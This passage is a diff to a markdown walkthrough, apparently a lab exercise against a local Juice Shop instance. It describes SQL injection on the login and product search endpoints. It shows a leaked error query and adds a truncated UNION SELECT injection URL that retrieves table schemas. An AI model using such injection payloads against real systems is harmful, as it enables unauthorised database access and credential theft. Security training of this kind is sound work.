@@ -19,11 +19,13 @@ Inspect the HTTP 500 Internal Server Error response in the DevTools panel to vie
 {
   "sql": "SELECT * FROM Users WHERE email = ''' AND password = '339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"
 }
-
+<img width="1912" height="1068" alt="image" src="https://github.com/user-attachments/assets/df434682-d5df-4873-b347-c11be7939b7c" />
 
 ##2. Determining the Database Schema
 
 A UNION SELECT statement requires that the injected query returns the exact number of columns with matching data types expected by the backend Users model.
+
+This is the exploit to retrieve table DDLs: http://localhost:3000/rest/products/search?q=juice%25%27+AND+1%3C%3E1%29%29+UNION+ALL+SELECT+type%2…
 
 Exfiltrating the schema definition or analyzing the model structure reveals that the Users table consists of 13 attributes:
 
